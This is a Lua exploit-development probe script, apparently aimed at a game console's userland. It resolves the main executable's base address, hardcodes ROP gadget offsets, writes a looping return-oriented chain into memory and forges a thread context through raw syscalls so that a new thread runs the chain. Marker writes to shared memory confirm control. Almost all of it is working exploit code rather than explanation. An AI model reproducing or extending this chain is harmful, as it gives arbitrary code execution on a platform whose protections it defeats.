-- CRASH_CLASS: MODERATE
-- PROBE 127j: Full ROP write loop via child thread
--
-- 127i confirmed: child thread executes one gadget and writes to shared memory.
-- Now test full ROP chain: multiple gadgets chained via ret, with a loop.
-- Uses +0xD0=0 (the fix from 127i).
--
-- Chain: pop_rdi→shared; pop_rax→marker1; mov[rdi],rax;ret;
--        pop_rdi→shared+8; pop_rax→marker2; mov[rdi],rax;ret;
--        pop_rsp→chain_start (infinite loop)
--
-- Two approaches tested:
-- [A] RIP = ret gadget, RSP = chain (ROP entry via ret)
-- [B] If A fails, RIP = first chain gadget, RSP = chain+8 (direct entry)

print("=== PROBE 127j: ROP WRITE LOOP ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local function alive()
    return N(native.fcall_with_rax(stub, 20)) == pid
end

-- Eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Gadgets
local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    mov_w   = 0x92C67,
    jmp_self = 0x15481,
}

-- Allocations
local shared  = memory.alloc(0x1000)
local stk_buf = memory.alloc(0x4000)
local ctx_buf = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local S   = N(shared)
local STK = N(stk_buf)
local BC  = N(ctx_buf)

-- Zero shared + tid
wq(S, uint64("0x0"))
wq(S + 8, uint64("0x0"))
wq(S + 16, uint64("0x0"))
wq(N(tid_buf), uint64("0x0"))

-- [A] ROP chain at STK + 0x3000
print("")
print("[A] Building ROP chain")
local CB = STK + 0x3000

-- Chain layout:
-- [0x00] pop_rdi; ret
-- [0x08] &shared[0]
-- [0x10] pop_rax; ret
-- [0x18] 0xDEADBEEFCAFE0001
-- [0x20] mov [rdi],rax; ret  → write marker1
-- [0x28] pop_rdi; ret
-- [0x30] &shared[8]
-- [0x38] pop_rax; ret
-- [0x40] 0x2222222233333333
-- [0x48] mov [rdi],rax; ret  → write marker2
-- [0x50] pop_rdi; ret
-- [0x58] &shared[16]
-- [0x60] pop_rax; ret
-- [0x68] 0xAAAABBBBCCCCDDDD  → third marker (proves multi-iteration)
-- [0x70] mov [rdi],rax; ret
-- [0x78] pop_rsp; ret
-- [0x80] &chain_start        → loop back

wq(CB + 0x00, eaddr(G.pop_rdi))
wq(CB + 0x08, shared)
wq(CB + 0x10, eaddr(G.pop_rax))
wq(CB + 0x18, uint64("0xDEADBEEFCAFE0001"))
wq(CB + 0x20, eaddr(G.mov_w))
wq(CB + 0x28, eaddr(G.pop_rdi))
wq(CB + 0x30, uint64(string.format("0x%X", S + 8)))
wq(CB + 0x38, eaddr(G.pop_rax))
wq(CB + 0x40, uint64("0x2222222233333333"))
wq(CB + 0x48, eaddr(G.mov_w))
wq(CB + 0x50, eaddr(G.pop_rdi))
wq(CB + 0x58, uint64(string.format("0x%X", S + 16)))
wq(CB + 0x60, eaddr(G.pop_rax))
wq(CB + 0x68, uint64("0xAAAABBBBCCCCDDDD"))
wq(CB + 0x70, eaddr(G.mov_w))
wq(CB + 0x78, eaddr(G.pop_rsp))
wq(CB + 0x80, uint64(string.format("0x%X", CB)))

-- Verify first few entries
print(string.format("  [0x00]=%s (pop_rdi)", fmt(rq(CB))))
print(string.format("  [0x08]=%s (shared)", fmt(rq(CB + 0x08))))
print(string.format("  [0x20]=%s (mov_w)", fmt(rq(CB + 0x20))))
print(string.format("  [0x78]=%s (pop_rsp)", fmt(rq(CB + 0x78))))
print(string.format("  [0x80]=%s (chain_start)", fmt(rq(CB + 0x80))))

if not alive() then print("DIED!") return end

-- [B] Ucontext: RIP = ret gadget, RSP = chain base
print("")
print("[B] Ucontext (RIP=ret, RSP=chain)")

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end

-- Gates
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)          -- MUST be 0 (127i fix)
wd(BC + 0x110, 0x10000)

-- Segments
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)

-- RIP = ret gadget (chain entry)
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)

-- RSP = chain base
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

print(string.format("  RIP=0x%X%08X RSP=0x%X%08X", rip_hi, rip_lo, rsp_hi, rsp_lo))

-- Create thread
local sc_thr = mk(430)
local thr_ret = nil
local thr_ok = pcall(function()
    thr_ret = sc_thr(ctx_buf, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
end)

local tid_val = rq(N(tid_buf))
print(string.format("  ret=%s tid=%s", fmt(thr_ret), fmt(tid_val)))

if not alive() then print("DIED after thr_create!") return end

-- Wait and check
for i = 1, 300 do native.fcall_with_rax(stub, 20) end

local r0 = rq(S)
local r8 = rq(S + 8)
local r16 = rq(S + 16)
print(string.format("  shared[0] =%s", fmt(r0)))
print(string.format("  shared[8] =%s", fmt(r8)))
print(string.format("  shared[16]=%s", fmt(r16)))

if r0 and fmt(r0) == fmt(uint64("0xDEADBEEFCAFE0001")) then
    print("  *** MARKER 1 OK ***")
end
if r8 and fmt(r8) == fmt(uint64("0x2222222233333333")) then
    print("  *** MARKER 2 OK ***")
end
if r16 and fmt(r16) == fmt(uint64("0xAAAABBBBCCCCDDDD")) then
    print("  *** MARKER 3 OK — FULL ROP CHAIN WORKS ***")
end

-- If approach A failed, try approach B (direct gadget entry)
if r0 == nil or N(r0) == 0 then
    print("")
    print("[C] Trying direct entry (RIP=pop_rdi, RSP=chain+8)")

    -- Reset
    wq(S, uint64("0x0"))
    wq(S + 8, uint64("0x0"))
    wq(S + 16, uint64("0x0"))
    wq(N(tid_buf), uint64("0x0"))

    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480)
    wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43)
    wd(BC + 0x100, 0x3B)

    -- RIP = pop_rdi gadget (first chain entry)
    local rip2_lo = (text_lo + G.pop_rdi) % 0x100000000
    local rip2_hi = text_hi + math.floor((text_lo + G.pop_rdi) / 0x100000000)
    wd(BC + 0xE0, rip2_lo)
    wd(BC + 0xE4, rip2_hi)

    -- RSP = chain + 8 (args start here)
    local rsp2_lo = (CB + 8) % 0x100000000
    local rsp2_hi = math.floor((CB + 8) / 0x100000000)
    wd(BC + 0xF8, rsp2_lo)
    wd(BC + 0xFC, rsp2_hi)

    print(string.format("  RIP=0x%X%08X RSP=0x%X%08X", rip2_hi, rip2_lo, rsp2_hi, rsp2_lo))

    local r2 = nil
    pcall(function()
        r2 = sc_thr(ctx_buf, tid_buf, uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    local t2 = rq(N(tid_buf))
    print(string.format("  ret=%s tid=%s", fmt(r2), fmt(t2)))

    if not alive() then print("DIED!") return end

    for i = 1, 300 do native.fcall_with_rax(stub, 20) end

    local s0 = rq(S)
    local s8 = rq(S + 8)
    local s16 = rq(S + 16)
    print(string.format("  shared[0] =%s", fmt(s0)))
    print(string.format("  shared[8] =%s", fmt(s8)))
    print(string.format("  shared[16]=%s", fmt(s16)))

    if s0 and N(s0) ~= 0 then
        print("  *** DIRECT ENTRY ROP WORKS ***")
    else
        print("  direct entry also failed")
    end
end

-- thr_kill
if tid_val and N(tid_val) ~= 0 then
    local kr = nil
    pcall(function()
        kr = mk(433)(tid_val, uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  thr_kill=%s", fmt(kr)))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 127j COMPLETE ===")
